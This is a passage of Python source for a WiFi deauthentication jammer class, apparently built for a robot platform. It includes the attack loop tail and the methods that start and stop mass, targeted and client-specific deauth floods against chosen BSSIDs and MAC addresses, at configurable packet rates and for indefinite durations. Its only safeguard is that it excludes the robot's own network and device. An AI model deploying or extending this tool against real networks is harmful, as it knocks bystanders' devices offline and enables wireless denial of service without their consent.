                                self._update_status(
                                    state=JammerState.ERROR,
                                    error_message=f"Stopping after repeated send errors: {e}",
                                )
                                self._stop_event.set()
                                break

                # Sleep to maintain packet rate
                time.sleep(packet_interval)

        except Exception as e:
            logger.error(f"Jamming loop error: {e}")
            self._update_status(state=JammerState.ERROR, error_message=str(e))
        finally:
            if not self._stop_event.is_set():
                with self._status_lock:
                    if self._status.state == JammerState.RUNNING:
                        if self._status.start_time:
                            self._status.uptime_seconds = time.time() - self._status.start_time
                        self._status.state = JammerState.IDLE
                        self._status.mode = None
                        self._status.target_bssid = None
                        self._status.target_macs = []
                        self._status.channel = None
                        self._status.start_time = None
            self._set_managed_mode()
            logger.info("Jamming loop stopped")

    def start_attack(
        self,
        mode: str,
        target_bssids: Optional[List[str]] = None,
        target_macs: Optional[List[str]] = None,
        channel: Optional[int] = None,
        packet_rate: int = 100,
        duration: Optional[float] = None
    ) -> dict:
        """
        Start the deauthentication attack

        Args:
            mode: Attack mode ("mass", "targeted", or "client")
            target_bssids: List of target BSSIDs (for mass/targeted modes)
            target_macs: List of target MAC addresses (for client mode)
            channel: WiFi channel to use
            packet_rate: Packets per second (10-500)
            duration: Attack duration in seconds (None for indefinite)

        Returns:
            Status dictionary
        """
        try:
            # Validate inputs
            if mode not in [m.value for m in JammerMode]:
                return {"status": "error", "message": f"Invalid mode: {mode}"}

            mode_enum = JammerMode(mode)

            # Validate packet rate
            packet_rate = max(10, min(packet_rate, self._max_packet_rate))

            # Validate targets based on mode
            if mode_enum == JammerMode.CLIENT:
                if not target_macs or len(target_macs) == 0:
                    return {"status": "error", "message": "No target MACs provided for client mode"}
                # Validate MAC address format
                for mac in target_macs:
                    if not re.match(r'^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$', mac):
                        return {"status": "error", "message": f"Invalid MAC address format: {mac}"}
                # For client mode, we need the BSSID of the network they're on
                if not target_bssids or len(target_bssids) == 0:
                    return {"status": "error", "message": "Network BSSID required for client mode"}
                # Validate BSSID format
                for bssid in target_bssids:
                    if not re.match(r'^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$', bssid):
                        return {"status": "error", "message": f"Invalid BSSID format: {bssid}"}
            elif mode_enum == JammerMode.MASS:
                # Mass mode can optionally have target_macs for enhanced mass deauth
                if target_macs and len(target_macs) > 0:
                    # Validate MAC address format if provided
                    for mac in target_macs:
                        if not re.match(r'^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$', mac):
                            return {"status": "error", "message": f"Invalid MAC address format: {mac}"}
                if not target_bssids or len(target_bssids) == 0:
                    return {"status": "error", "message": "No target BSSIDs provided"}
                # Validate BSSID format
                for bssid in target_bssids:
                    if not re.match(r'^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$', bssid):
                        return {"status": "error", "message": f"Invalid BSSID format: {bssid}"}
            else:
                if not target_bssids or len(target_bssids) == 0:
                    return {"status": "error", "message": "No target BSSIDs provided"}
                # Validate BSSID format
                for bssid in target_bssids:
                    if not re.match(r'^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$', bssid):
                        return {"status": "error", "message": f"Invalid BSSID format: {bssid}"}

            # Check if already running
            if self._status.state == JammerState.RUNNING:
                return {"status": "error", "message": "Attack already running"}

            # Detect and protect robot network
            self._detect_robot_network()

            # Validate that robot network is not in targets (except for client mode and enhanced mass mode)
            # In client mode and enhanced mass mode, we allow attacking the robot's network but not the robot's device
            if mode_enum != JammerMode.CLIENT and not (mode_enum == JammerMode.MASS and target_macs):
                if self._robot_network_bssid and self._robot_network_bssid in target_bssids:
                    return {
                        "status": "error",
                        "message": f"Cannot attack robot's own network ({self._robot_network_bssid})"
                    }

            # Validate that robot MAC is not in client targets
            if target_macs and self._robot_mac and self._robot_mac in target_macs:
                return {
                    "status": "error",
                    "message": f"Cannot attack robot's own device ({self._robot_mac})"
                }

            # Set monitor mode
            if not self._set_monitor_mode():
                return {"status": "error", "message": "Failed to set monitor mode"}

            # Prepare attack
            self._stop_event.clear()
            self._update_status(
                state=JammerState.RUNNING,
                mode=mode_enum,
                target_bssid=target_bssids[0] if len(target_bssids) == 1 else None,
                target_macs=target_macs or [],
                channel=channel,
                packets_sent=0,
                start_time=time.time(),
                error_message=""
            )

            # Start jamming thread
            self._jammer_thread = threading.Thread(
                target=self._jamming_loop,
                args=(mode_enum, target_bssids, target_macs, channel, packet_rate, duration),
                daemon=True,
                name="wifi-jammer"
            )
            self._jammer_thread.start()

            logger.info(f"Attack started - Mode: {mode}, BSSIDs: {len(target_bssids or [])}, MACs: {len(target_macs or [])}")
            return {
                "status": "started",
                "mode": mode,
                "targets": target_bssids or [],
                "target_macs": target_macs or [],
                "packet_rate": packet_rate,
                "duration": duration
            }

        except Exception as e:
            logger.error(f"Error starting attack: {e}", exc_info=True)
            return {"status": "error", "message": str(e)}

    def stop_attack(self) -> dict:
        """
        Stop the deauthentication attack

        Returns:
            Status dictionary with final statistics
        """
        if self._status.state != JammerState.RUNNING:
            return {"status": "error", "message": "No attack running"}

        logger.info("Stopping attack...")
        self._stop_event.set()

        # Wait for thread to finish
        if self._jammer_thread:
            self._jammer_thread.join(timeout=5)

        # Get final stats
        with self._status_lock:
            final_stats = {
                "status": "stopped",
                "packets_sent": self._status.packets_sent,
                "uptime_seconds": round(self._status.uptime_seconds, 2),
                "mode": self._status.mode.value if self._status.mode else None
            }

        # Reset status
        self._update_status(
            state=JammerState.IDLE,
            mode=None,
            target_bssid=None,
            packets_sent=0,
            start_time=None,
            uptime_seconds=0.0
        )

        logger.info(f"Attack stopped - Sent {final_stats['packets_sent']} packets")
        return final_stats

    def cleanup(self) -> None:
        """Clean up resources and reset interface"""
        logger.info("Cleaning up WiFi jammer...")

        # Stop any running attacks
        if self._status.state == JammerState.RUNNING:
            self.stop_attack()

        self._set_managed_mode()
